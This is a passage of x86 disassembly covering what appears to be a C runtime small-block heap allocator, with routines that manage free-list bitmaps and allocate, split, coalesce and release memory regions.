  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
